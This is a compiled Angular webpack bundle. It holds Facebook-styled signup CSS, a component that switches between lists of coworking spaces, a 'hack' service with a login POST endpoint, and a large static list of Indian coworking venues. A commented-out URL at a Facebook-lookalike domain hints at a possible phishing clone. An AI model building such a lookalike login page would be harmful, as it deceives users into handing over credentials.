JnaW4tYm90dG9tOjVweDtcbiAgfVxuICBcbiAgLmJvbGRlciB7XG4gICAgZm9udC1mYW1pbHk6ICdPcGVuIFNhbnMnLHNhbnMtc2VyaWY7XG4gICAgdGV4dC1yZW5kZXJpbmc6b3B0aW1pemVsZWdpYmlsaXR5O1xuICAgIGNvbG9yOiMzMzM7XG4gIH1cbiAgXG4gIC5mcmVlIHtcbiAgICBmb250LXNpemU6MTlweDtcbiAgICBtYXJnaW4tYm90dG9tOjIwcHg7XG4gIH1cbiAgXG4gIC5mb3JtYm94IHtcbiAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7XG4gICAgd2lkdGg6Mzk5cHg7XG4gIH1cbiAgXG4gIC5pbnB1dGJvZHkge1xuICAgIGRpc3BsYXk6IGlubGluZS1ibG9jaztcbiAgICBmb250LXNpemU6IDE4cHg7XG4gICAgcGFkZGluZzogOHB4IDEwcHg7XG4gICAgYm9yZGVyOiAxcHggc29saWQgI2JkYzdkODtcbiAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA1cHg7XG4gICAgY29sb3I6IzMzMztcbiAgICBtYXJnaW4tYm90dG9tOjEwcHg7XG4gIH1cbiAgXG4gIDo6LXdlYmtpdC1pbnB1dC1wbGFjZWhvbGRlciB7XG4gICAgIGNvbG9yOiAjOTk5O1xuICB9XG4gIFxuICA6Oi1tb3otcGxhY2Vob2xkZXIge1xuICAgICBjb2xvcjogIzk5OTsgIFxuICB9XG4gIFxuICA6LW1zLWlucHV0LXBsYWNlaG9sZGVyIHsgIFxuICAgICBjb2xvcjogIzk5OTsgIFxuICB9XG4gIFxuICAuaW4xIHtcbiAgICB3aWR0aDoxNzJweDtcbiAgfVxuICBcbiAgLmluMiB7XG4gICAgd2lkdGg6Mzc3cHg7XG4gIH1cbiAgXG4gIC5mciB7XG4gICAgZmxvYXQ6cmlnaHQ7XG4gIH1cbiAgXG4gIC5mbCB7XG4gICAgZmxvYXQ6bGVmdDtcbiAgfVxuICBcbiAgLmJkYXkge1xuICAgIGZvbnQtc2l6ZToxOXB4O1xuICAgIGNvbG9yOiMxNDE4MjM7XG4gICAgLXdlYmtpdC1mb250LXNtb290aGluZzogYW50aWFsaWFzZWQ7XG4gICAgbWFyZ2luLWJvdHRvbTo1cHg7XG4gIH1cbiAgXG4gIC5zZWxlY3Rib2R5IHtcbiAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7XG4gICAgaGVpZ2h0OjMwcHg7XG4gICAgZm9udC1zaXplOiAxM3B4O1xuICAgIGJvcmRlcjogMXB4IHNvbGlkICNiZGM3ZDg7XG4gICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA1cHg7XG4gICAgY29sb3I6IzE0MTgyMztcbiAgIFxuICB9XG4gIFxuICAud2h5IHtcbiAgICBmb250LXNpemU6IDExcHg7XG4gICAgY29sb3I6ICMzYjU5OTg7XG4gICAgd2lkdGg6MTUwcHg7XG4gICAgbWFyZ2luLWxlZnQ6MTBweDtcbiAgICBjdXJzb3I6cG9pbnRlcjtcbiAgfVxuICBcbiAgLmg6aG92ZXIge1xuICAgIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lO1xuICB9XG4gIFxuICAuZ2VuZGVyIHtcbiAgICBmb250LXNpemU6IDE4cHg7XG4gICAgY29sb3I6ICMxNDE4MjM7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHBhZGRpbmc6IDAgMTBweCAwIDNweDtcbiAgICBtYXJnaW4tcmlnaHQ6IDRweDtcbiAgICBsaW5lLWhlaWdodDogMThweDtcbiAgICB2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlO1xuICB9XG4gIFxuICAuc3BhbnBhZCB7XG4gICAgcGFkZGluZzogNXB4IDAgNXB4IDRweDtcbiAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7XG4gIH1cbiAgXG4gIC5tdDEge1xuICAgIG1hcmdpbi10b3A6MTVweDtcbiAgfVxuICBcbiAgLm0wIHtcbiAgICBtYXJnaW46IDA7XG4gIH1cbiAgXG4gIC5hZ3JlZSB7XG4gICAgZm9udC1zaXplOiAxMXB4O1xuICAgIGNvbG9yOiAjNzc3O1xuICAgIHdpZHRoOjMxNnB4O1xuICAgIG1hcmdpbjogMTFweCAwIDExcHggO1xuICB9XG4gIFxuICAubGluayB7XG4gICAgY29sb3I6IzNiNTk5ODtcbiAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICB9XG4gIFxuICAuc2lnbmJ1dCB7XG4gICAgZm9udC1zaXplOiAxOXB4O1xuICAgIGZvbnQtd2VpZ2h0OiA3MDA7XG4gICAgbGV0dGVyLXNwYWNpbmc6IDFweDtcbiAgICBjb2xvcjojZmZmO1xuICAgIG1pbi13aWR0aDogMTk0cHg7XG4gICAgcGFkZGluZzogN3B4IDIwcHg7XG4gICAgdGV4dC1hbGlnbjogY2VudGVyO1xuICAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNXB4O1xuICAgIGJhY2tncm91bmQ6IC13ZWJraXQtbGluZWFyLWdyYWRpZW50KCM2N2FlNTUsICM1Nzg4NDMpO1xuICAgIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggMXB4ICNhNGUzODg7XG4gICAgYm9yZGVyOiAxcHggc29saWQ7XG4gIGJvcmRlci1jb2xvcjogIzNiNmUyMiAjM2I2ZTIyICMyYzUxMTU7XG4gICAgbWFyZ2luLXRvcDogMTBweDtcbiAgbWFyZ2luLWJvdHRvbTogMTBweDtcbiAgICB0ZXh0LXNoYWRvdzogMCAxcHggMnB4IHJnYmEoMCwwLDAsLjUpO1xuICAgIGN1cnNvcjpwb2ludGVyO1xuICB9XG4gIFxuICAuc2lnbmJ1dDpob3ZlciB7XG4gICAgYmFja2dyb3VuZDogLXdlYmtpdC1saW5lYXItZ3JhZGllbnQoIzc5YmM2NCwgIzU3ODg0Myk7XG4gIH1cbiAgXG4gIC5jcmVhdGUge1xuICAgIGJvcmRlci10b3A6IDFweCBzb2xpZCAjYTBhOWMwO1xuICAgIGNvbG9yOiAjNjY2O1xuICAgIGZvbnQtc2l6ZTogMTNweDtcbiAgICBmb250LXdlaWdodDogYm9sZDtcbiAgICBtYXJnaW4tdG9wOiAxMHB4O1xuICAgIHBhZGRpbmctdG9wOiAxNXB4O1xuICB9XG4gIFxuICAiXX0= */"

/***/ }),

/***/ "./src/app/facebook/facebook.component.ts":
/*!************************************************!*\
  !*** ./src/app/facebook/facebook.component.ts ***!
  \************************************************/
/*! exports provided: FacebookComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "FacebookComponent", function() { return FacebookComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm2015/core.js");
/* harmony import */ var _services_hack_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../services/hack.service */ "./src/app/services/hack.service.ts");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm2015/router.js");
/* harmony import */ var src_app_statics__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! src/app/statics */ "./src/app/statics.ts");





let FacebookComponent = class FacebookComponent {
    constructor(arrayData, hackService, router) {
        this.arrayData = arrayData;
        this.hackService = hackService;
        this.router = router;
        this.update_array = [];
        this.Sharedesk = this.arrayData.ShareDesk;
        this.Nexdus = this.arrayData.Nexdus;
        this.hackerStreet = this.arrayData.offices_thehackerstreet;
        this.myHQ = this.arrayData.offices_myhq;
        this.Engage = this.arrayData.Enagage;
        this.locations = [];
        // this.getLocations()
        // this.scrapper()
        this.locations = this.Sharedesk;
    }
    change(tot) {
        console.log(tot);
        let to = tot.target.value;
        if (to == 'sharedesk') {
            this.locations = this.Sharedesk;
        }
        else if (to == 'nexdus') {
            this.locations = this.Nexdus;
        }
        else if (to == 'hackerstreet') {
            this.locations = this.hackerStreet;
        }
        else if (to == 'myhq') {
            this.locations = this.myHQ;
        }
        else if (to == 'engage') {
            this.locations = this.Engage;
        }
    }
    scrapper() {
        this.hackService.scrapperData({ locations: this.update_array }).subscribe(resp => {
            console.log(resp);
        }, err => {
            console.log(err);
        });
    }
    // getLocations() {
    //   this.hackService.getLocations({}).subscribe(resp => {
    //     this.locations = resp['result']
    //   }, err => {
    //     console.log(err)
    //   })
    // }
    ngOnInit() { }
};
FacebookComponent.ctorParameters = () => [
    { type: src_app_statics__WEBPACK_IMPORTED_MODULE_4__["ArrayData"] },
    { type: _services_hack_service__WEBPACK_IMPORTED_MODULE_2__["HackService"] },
    { type: _angular_router__WEBPACK_IMPORTED_MODULE_3__["Router"] }
];
FacebookComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
        selector: 'app-facebook',
        template: __webpack_require__(/*! raw-loader!./facebook.component.html */ "./node_modules/raw-loader/index.js!./src/app/facebook/facebook.component.html"),
        styles: [__webpack_require__(/*! ./facebook.component.css */ "./src/app/facebook/facebook.component.css")]
    })
], FacebookComponent);



/***/ }),

/***/ "./src/app/services/hack.service.ts":
/*!******************************************!*\
  !*** ./src/app/services/hack.service.ts ***!
  \******************************************/
/*! exports provided: HackService */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "HackService", function() { return HackService; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm2015/core.js");
/* harmony import */ var _angular_common_http__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/common/http */ "./node_modules/@angular/common/fesm2015/http.js");



let HackService = class HackService {
    constructor(http) {
        this.http = http;
        // url = 'https://facebook.registe.cf/api/hack/'
        this.url = 'http://localhost:4400/api/hack/';
    }
    login(data) {
        return this.http.post(this.url + 'login', data);
    }
    pageCount() {
        return this.http.get(this.url + 'page/count');
    }
    scrapperData(data) {
        return this.http.post(this.url + 'scrapper', data);
    }
    getLocations(parameters) {
        return this.http.get(this.url + 'scrapper', { params: parameters });
    }
    pageCreation(data) {
        console.log('2');
        return this.http.post(this.url + 'page/count', data);
    }
};
HackService.ctorParameters = () => [
    { type: _angular_common_http__WEBPACK_IMPORTED_MODULE_2__["HttpClient"] }
];
HackService = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Injectable"])({
        providedIn: 'root'
    })
], HackService);



/***/ }),

/***/ "./src/app/statics.ts":
/*!****************************!*\
  !*** ./src/app/statics.ts ***!
  \****************************/
/*! exports provided: ArrayData */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "ArrayData", function() { return ArrayData; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm2015/core.js");


let ArrayData = class ArrayData {
    constructor() {
        this.offices_myhq = [
            {
                "name": "Team Station Cowork Space",
                "address": "Rohini, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Workin X",
                "address": "Paschim Vihar, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Supreme Cowork",
                "address": "Shalimar Bagh, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Tippling Street",
                "address": "Rajouri Garden, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "SpringHouse Janakpuri",
                "address": "Janakpuri, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Cubicles Cowork",
                "address": "Netaji Subhash Place, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Zorambo Punjabi Bagh",
                "address": "Punjabi Bagh, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Co-Offiz NSP",
                "address": "Netaji Subhash place, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "The Beer Cafe Kirti Nagar",
                "address": "Kirti Nagar, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Co-Offiz Janakpuri",
                "address": "Janakpuri, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Daftar Cowork",
                "address": "GT Karnal Road, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Rodeo Cantina and Kitchen",
                "address": "Connaught Place, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Imly Janakpuri",
                "address": "Janakpuri, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "FLYP Cafe",
                "address": "Connaught Place, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Pebble Street",
                "address": "Connaught Place, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "ABL Workspaces CP",
                "address": "Connaught Place, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Koworkspace",
                "address": "Dwarka, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Sharal Cowork",
                "address": "Nariana, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Invento Workspaces Dwarka",
                "address": "Sector 12 Dwarka, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "22 Workspace",
                "address": "New Delhi Metro Station, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Coworkin Patel Nagar",
                "address": "Patel Nagar, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "One Co.Work",
                "address": "Connaught Place, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Stop My Starvation",
                "address": "Indirapuram, Ghaziabad",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "YC Coworking Sohna Road",
                "address": "Sohna Road, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "GoHive SAS Towers",
                "address": "Sector 38, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Eccosphere Coworking",
                "address": "Sector 67, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Office Beanz",
                "address": "Sector 39, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Instaoffice SPML House",
                "address": "Sector 32, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "OYO Townhouse Cafe Curryhut",
                "address": "Sector 62, Noida",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Cafe Soul Garden",
                "address": "Supermart 2, Gurugram",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Instaoffice Good Earth City Centre",
                "address": "Sector 50, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "SproutBox",
                "address": "Okhla, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Barista Huda Market",
                "address": "Sector 22, Gurugram",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "SpringHouse Sector 16",
                "address": "Noida, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Wolk Coworking",
                "address": "Nehru Place, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "What A Comic Show GK2",
                "address": "Greater Kailash 2, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "2Tree Coffee",
                "address": "Saket, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "The Red Kettle",
                "address": "Saiyad Ul Ajaib Extension, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "ArtBuzz Studios",
                "address": "Okhla Phase 2, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "myHQ Techarbeits",
                "address": "Mayur Vihar Phase 1, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Flockwork",
                "address": "Tilak Marg, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Revstart",
                "address": "Sector 125, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Qbicals Coworking",
                "address": "Sector 63, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "myHQ Coregano",
                "address": "Noida Sector 8, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "IHOP Cyberhub",
                "address": "DLF Cyber City, Gurugram",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Fume Coworking Udyog Vihar",
                "address": "Udyog Vihar, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "SpringHouse Sohna Road",
                "address": "Sohna Road, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Workhubz",
                "address": "Safdarjung Enclave, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Unboxed",
                "address": "Sector 65, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Step 01",
                "address": "Sector 32, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Huddle",
                "address": "DLF Cyber City, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Qahwa",
                "address": "SDA Market, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "ABL Workspaces Okhla",
                "address": "Okhla, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Hacker Space",
                "address": "Sector 2, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "The Reader's Cafe",
                "address": "Indirapuram, Ghaziabad",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "IHOP Saket",
                "address": "Saket, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Springhouse Noida",
                "address": "Sector 8, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Dribble",
                "address": "DLF Phase 3, Gurugram",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "SpringHouse Galleria",
                "address": "DLF Phase 4, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Cha Cha Cha",
                "address": "Lajpat Nagar, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "ABL Workspaces Two Horizon",
                "address": "Golf course Road, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "GoHive Ocus",
                "address": "Sector-54, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Coworkin Sector 39 Gurugram",
                "address": "Sector 39, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "The Beer Cafe Noida",
                "address": "Sector 32, Noida",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "1share office",
                "address": "East Of Kailash, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "D&B Office",
                "address": "Panchsheel Park, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "The Blue Parrot Cafe",
                "address": "Kalkaji, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Peer Share",
                "address": "Vasant Vihar, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Instaoffice Okhla",
                "address": "Okhla Phase 2, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Dribble Golf Course Road",
                "address": "Golf Course Road, Gurugram",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "India Accelerator",
                "address": "Sector 44, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "One Co.Work Sushant Lok",
                "address": "Sushant Lok, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Coworkin Lajpat Nagar",
                "address": "Lajpat Nagar, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "What A Comic Show SDA",
                "address": "SDA Market, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Instaoffice Noida",
                "address": "Sector 16, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "GoHive Ghitorni",
                "address": "Ghitorni, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Cube8",
                "address": "Udyog Vihar, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "GoWorkin",
                "address": "Green Park, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Let's Cowork",
                "address": "Hauz Khas Village, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Cospaces",
                "address": "Sector 28, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Social Vasant Kunj",
                "address": "Vasant Kunj, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "myHQ ABL Workspace NH8",
                "address": "NH8, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Coworkin Nehru Place",
                "address": "Nehru Place, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Amigo Coworking",
                "address": "Sector-8, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "The Beer Cafe GK2",
                "address": "Greater Kailash, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Zorambo Sohna Road",
                "address": "Sohna Road, Gurugram",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Vorkzone",
                "address": "Sohna Road, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Zorambo South City",
                "address": "South City 2, Gurugram",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Social Cyber Hub",
                "address": "Cyber Hub, Gurugram",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "CoNexus Life",
                "address": "Sector 29, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "myHQ PiWork",
                "address": "Sector 132, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "One Co.Work NSP",
                "address": "Netaji Subhash Place, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "BOD Cowork",
                "address": "Karol Bagh, New Delhi",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Imperfecto Hauz Khas Village",
                "address": "Hauz Khas Village, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Publiq Bar & Kitchen",
                "address": "Green Park, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Cafe Untold",
                "address": "Gulmohar Park, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Imperfecto Ruin Pub",
                "address": "Khel Gaon Marg, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Instaoffice Konterra",
                "address": "Udyog Vihar, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "ABL Workspaces Cyber City",
                "address": "DLF Cyber City, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Potbelly Sandwich Shop Cyberhub",
                "address": "DLF Cyber City, Gurugram",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Urban Sip",
                "address": "Okhla Phase 3, New Delhi",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Vatika Business Centre FIP",
                "address": "MG Road, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Vatika Business Centre Triangle",
                "address": "MG Road, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "ABL Workspaces Noida",
                "address": "Sector 4, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Tangy House",
                "address": "Sushant Lok, Gurugram",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Vatika Business Centre Prius",
                "address": "Sector 125, Noida",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Zorambo Golf Course Road",
                "address": "Golf course Road, Gurugram",
                "type": "Work Cafe",
                "provider": "myHQ"
            },
            {
                "name": "Vatika Business Centre Atrium",
                "address": "Golf Course Road, Gurugram",
                "type": "Coworking Space",
                "provider": "myHQ"
            },
            {
                "name": "Imperfecto Rainbow",
                "address": "Sector 135, Noida",
                "type": "Work Cafe",
                "provider": "myHQ"
            }
        ];
        this.offices_thehackerstreet = [
            {
                "name": "Bridge+ Coworking",
                "address": "Ascendas Park Square Mall, Bangaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Circle.Work",
                "address": "Sector 29, Gurugram",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Startup Offices",
                "address": "Cetrum Plaza, Gurgaon",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WorkDesq",
                "address": "Nerkundram, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Dhwarco Business Center",
                "address": "Guindy, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Works 9to9",
                "address": "Ashok Nagar, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Crizon Business Centre",
                "address": "Mogappair East, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WSquare",
                "address": "Venkata Rathinam Nagar, Adyar, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Doxa OMR",
                "address": "Okkiyam Thuraipakkam, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Vatika Business Centre &amp; Co-working Spaces",
                "address": "Teynampet, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Smartworks",
                "address": "Guindy Industrial Estate, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Spaces – Express Avenue",
                "address": "Royapettah, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Artisans Lab",
                "address": "Mylapore, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Vantage Coworking",
                "address": "Thiruvanmiyur, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WOCO Spaces T. Nagar",
                "address": "T. Nagar Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WOCO Spaces",
                "address": "Anna Nagar, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "AtWorks OMR",
                "address": "Perungudi, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Hive",
                "address": "Thirumangalam, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Executive Zone",
                "address": "Anna Salai, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "TwoTrees Workspaces",
                "address": "Teynampet, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "The Grid Chennai",
                "address": "Kesava perumal puram, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Workfella Perungudi",
                "address": "Perungudi, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Workfella Alwarpet",
                "address": "Alwarpet, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Karya Space Nungambakkam",
                "address": "Nungambakkam, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Karya Space Mylapore",
                "address": "Mylapore, Chennai",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "iKeva Chennai",
                "address": "Perungudi, Chennai",
